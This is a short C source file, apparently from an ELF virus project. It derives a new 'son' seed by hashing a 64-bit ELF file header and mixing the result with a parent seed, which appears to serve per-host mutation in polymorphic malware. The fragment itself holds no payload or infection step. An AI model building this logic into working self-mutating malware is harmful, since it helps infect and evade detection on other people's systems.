#include <stdbool.h>
#include <stdint.h>
#include <linux/elf.h>
#include "accessors.h"
#include "virus_header.h"
#include "utils.h"
#include "errors.h"
#include "logs.h"

static bool	compute_elf_hdr_hash(uint64_t *hdr_hash,
			struct safe_ptr file_ref)
{
	const Elf64_Ehdr	*elf_hdr = safe(file_ref, 0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_COMPUTE_ELF_HDR_HASH);

	*hdr_hash = hash((uint8_t*)elf_hdr, sizeof(*elf_hdr));
	return true;
}

bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref)
{
	uint64_t	hdr_hash;

	if (!compute_elf_hdr_hash(&hdr_hash, file_ref))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_GENERATE_SEED);

	uint64_t	father_seed = *seed;
	uint64_t	son_seed    = father_seed ^ hdr_hash;

	son_seed = hash((uint8_t*)&son_seed, sizeof(son_seed));
	log_seeds(father_seed, hdr_hash, son_seed);

	*seed = son_seed;
	return true;
}
